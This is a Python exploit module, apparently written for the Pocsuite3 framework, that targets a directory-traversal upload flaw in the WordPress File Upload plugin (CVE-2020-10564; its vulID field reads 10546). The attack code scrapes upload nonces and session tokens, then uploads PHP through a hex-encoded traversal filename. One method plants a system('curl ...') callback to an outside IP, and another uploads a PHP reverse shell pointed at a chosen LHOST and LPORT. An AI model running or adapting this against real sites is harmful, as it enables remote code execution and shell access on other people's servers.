"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""
from collections import OrderedDict
from urllib.parse import quote, urljoin

from Tools.PocSuite.api import POC_SCAN, Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptDict, VUL_TYPE, logger, paths
from Tools.PocSuite.lib.utils import random_str

import requests  # python-requests, eg. apt-get install python3-requests
import sys, os
import re
import uuid
from urllib.parse import urlparse, urljoin
import binascii
sys.path.append(os.path.dirname(os.getcwd()) + "/../")
from configvalue import * 

class DemoPOC(POCBase):
    vulID = 'CVE-2020-10546'  # ssvid
    version = '1.0'
    author = ['khoa']
    vulDate = '13/03/2020'
    createDate = '2020-11-15'
    updateDate = '2020-11-15'
    references = ['https://wpscan.com/vulnerability/10132']
    name = 'Wordpress File Upload < 4.13.0 - Directory traveral to RCE'
    appPowerLink = {"typescan" : POC_SCAN.EXPLOITS.DIR,
                "language"  : [POC_SCAN.LANGUAGE.PHP]}
    appName = 'wordpress-cve-2020-10564'
    appVersion = 'Wordpress File Upload < 4.13.0'
    vulType = VUL_TYPE.UPLOAD_FILES
    desc = '''WordPress File Upload plugin directory traversal. It's possible to use the directory traversal to gain RCE by uploading a file inside the /lib directory of the plugin.'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    pocDesc = '''CVSSv3: 9.8 (AV:N/AC:L/Au:N/C:P/I:P/A:P)'''
    url_result = {}

    # def _options(self):
    #     o = OrderedDict()
    #     payload = {
    #         "nc": REVERSE_PAYLOAD.NC,
    #         "bash": REVERSE_PAYLOAD.BASH,
    #     }
    #     o["command"] = OptDict(selected="bash", default=payload)
    #     return o

    def check_version(self, url):
        p_url = urlparse(self.url)
        base = p_url[2][1:].split('/')[0]
        url = p_url[0] + "://" + p_url[1] + "/" + base + "/wp-content/plugins/wp-file-upload/readme.txt"
        resp = requests.get(url, verify=False)
        fixed_version = 4.13 
        try: 
            match = re.findall(
                r'== Changelog ==\n\n= ([0-9]+\.[0-9])',
                str(resp.text)
            )
            if(float)(match[0]) < fixed_version: 
                return True
            else: 
                return False
        except: return False
         

    def _verify(self):
        result = {}
        check = self.check_version(self.url)
        if check: 
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)
           
    def _attack(self):
        flag = str(uuid.uuid4().hex)
        check = self.check_version(self.url)
        filename = random_str(6) + ".txt"
        print(filename)
        payload = "../plugins/wp-file-upload/lib/" + filename 
        payload = binascii.hexlify(payload.encode())
        page = requests.get(self.url, verify=False)
        cookie = page.cookies
        nonce = ''
        params_index = ''
        session_token = ''
        
        if 'wfu_uploader_nonce"' in page.text: 
            idx = page.text.find('wfu_uploader_nonce" value="') + len('wfu_uploader_nonce" value="')
            nonce = page.text[idx:idx+20].split('"')[0]
            print("[+] Retrived nonce parameter: "+ nonce)
        if 'params_index:"' in page.text: 
            idx = page.text.find('params_index:"') + len('params_index:"')
            params_index = page.text[idx:idx+30].split('"')[0]
            print("[+] Retrived params_index parameter: " + params_index) 
           
        if 'session:"' in page.text: 
            idx = page.text.find('session:"') + len('session:"')
            session_token = page.text[idx:idx+65].split('"')[0] 
            print("[+] Retrived session_token parameter: " + session_token)
        php_code = '''<?php system("curl http://''' + PUBLIC_IP + ''':65535/'''+ flag + '''"); ?>'''
        fsize = str(len(php_code))
        p_url = urlparse(self.url)
        base = p_url[2][1:].split('/')[0]
        admin_ajax_url = p_url[0] + "://" + p_url[1] + '/' + base + "/wp-admin/admin-ajax.php"
        
        result = {}
        if check:
            params = {
                "wfu_uploader_nonce":(None,nonce), "action":(None,"wfu_ajax_action"), 
                "uploadedfile_1_index": (None, "0"), "uploaded_1_size":(None, fsize), 
                "subdir_sel_index":(None, "-1"), "nofileupload_1":(None, "0"), "only_check":(None, "1"), 
                "session_token":(None, session_token), "uploadedfile_1_name":(None, payload), 
                "params_index":(None, params_index), "uniqueuploadid_1":(None, "KpNKThIx0T"), 
                "uploadedfile_1_size":(None, fsize), 
            }
            resp = requests.post(admin_ajax_url, files = params, cookies=cookie, verify=False)
            
            if "wfu_fileupload_success" in resp.text: 
                print("[+] Stage 1 success")   
            else: return
            params = {
                "wfu_uploader_nonce":(None, nonce), "action":(None,"wfu_ajax_action"), 
                "uploadedfile_1_index":(None,"0"), "uploadedfile_1_size":(None, fsize), 
                "subdir_sel_index": (None, "-1"), "nofileupload_1": (None,"0"), "only_check":(None,"0"),
                "session_token": (None, session_token), "uploadedfile_1_name": (None, payload), 
                "params_index":(None, params_index), "uniqueuploadid_1": (None, "KpNKThIx0T"), "uploadedfile_1": (filename, php_code)
            }
            r = requests.post(admin_ajax_url, files=params, cookies=cookie, verify=False)
            if "wfu_fileupload_success" in resp.text: 
                print("[+] Stage 2 success")   
            else: return
            d = {
                "wfu_uploader_nonce":(None,nonce), "action":(None,"wfu_ajax_action"), 
                "upload_finished": (None, "1"), 
                "session_token":(None, session_token), 
                "params_index":(None, params_index), "uniqueuploadid_1":(None, "KpNKThIx0T"), 
            }
            resp = requests.post(admin_ajax_url, data=d, cookies=cookie, verify=False)
            
            r = requests.get('http://' +PUBLIC_IP + ":65535/logfile.txt")
            if(flag in r.text): 
                result['ShellInfo'] = {}
                result['ShellInfo']["URL"] = self.url 
                result['ShellInfo']['INFO'] = php_code
            else: return
        return self.parse_output(result)        

    def _shell(self):
        datainput = self.headers['Referer']['input']
        self.headers['Referer'] = ''
        filename_source = os.path.join(paths.POCSUITE_ROOT_PATH, 'init_pocs/cve_2020_10564/php-reverse-shell-source.php')
        with open(filename_source, "rb") as file:
            shell  = file.read().decode()
            file.close()
        php_shell = shell.replace('LHOST_cve_2020_10564', datainput['LHOST'])
        php_shell = php_shell.replace('LPORT_cve_2020_10564', str(datainput['LPORT']))
        urlexploit = datainput['entrypoint']
        filename = random_str(6) + ".txt"
        print(filename)
        payload = "../plugins/wp-file-upload/lib/" + filename 
        payload = binascii.hexlify(payload.encode())
        page = requests.get(urlexploit, verify=False)
        cookie = page.cookies
        nonce = ''
        params_index = ''
        session_token = ''
        if 'wfu_uploader_nonce"' in page.text: 
            idx = page.text.find('wfu_uploader_nonce" value="') + len('wfu_uploader_nonce" value="')
            nonce = page.text[idx:idx+20].split('"')[0]
            print("[+] Retrived nonce parameter: "+ nonce)
        if 'params_index:"' in page.text: 
            idx = page.text.find('params_index:"') + len('params_index:"')
            params_index = page.text[idx:idx+30].split('"')[0]
            print("[+] Retrived params_index parameter: " + params_index) 
           
        if 'session:"' in page.text: 
            idx = page.text.find('session:"') + len('session:"')
            session_token = page.text[idx:idx+65].split('"')[0] 
            print("[+] Retrived session_token parameter: " + session_token)
        
        fsize = str(len(php_shell))
        p_url = urlparse(urlexploit)
        base = p_url[2][1:].split('/')[0]
        admin_ajax_url = p_url[0] + "://" + p_url[1] + '/' + base + "/wp-admin/admin-ajax.php"
        
        result = {}
        params = {
            "wfu_uploader_nonce":(None,nonce), "action":(None,"wfu_ajax_action"), 
            "uploadedfile_1_index": (None, "0"), "uploaded_1_size":(None, fsize), 
            "subdir_sel_index":(None, "-1"), "nofileupload_1":(None, "0"), "only_check":(None, "1"), 
            "session_token":(None, session_token), "uploadedfile_1_name":(None, payload), 
            "params_index":(None, params_index), "uniqueuploadid_1":(None, "KpNKThIx0T"), 
            "uploadedfile_1_size":(None, fsize), 
        }
        resp = requests.post(admin_ajax_url, files = params, cookies=cookie, verify=False)
            
        if "wfu_fileupload_success" in resp.text: 
            print("[+] Stage 1 success")   
        else: return
        params = {
            "wfu_uploader_nonce":(None, nonce), "action":(None,"wfu_ajax_action"), 
            "uploadedfile_1_index":(None,"0"), "uploadedfile_1_size":(None, fsize), 
            "subdir_sel_index": (None, "-1"), "nofileupload_1": (None,"0"), "only_check":(None,"0"),
            "session_token": (None, session_token), "uploadedfile_1_name": (None, payload), 
            "params_index":(None, params_index), "uniqueuploadid_1": (None, "KpNKThIx0T"), "uploadedfile_1": (filename, php_shell)
        }

        r = requests.post(admin_ajax_url, files=params, cookies=cookie, verify=False)
        if "wfu_fileupload_success" in resp.text: 
            print("[+] Stage 2 success")   
        else: return
        d = {
                "wfu_uploader_nonce":(None,nonce), "action":(None,"wfu_ajax_action"), 
                "upload_finished": (None, "1"), 
                "session_token":(None, session_token), 
                "params_index":(None, params_index), "uniqueuploadid_1":(None, "KpNKThIx0T"), 
            }
        resp = requests.post(admin_ajax_url, data=d, cookies=cookie, verify=False)
        print("[+] Stage 3 success")
        

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)
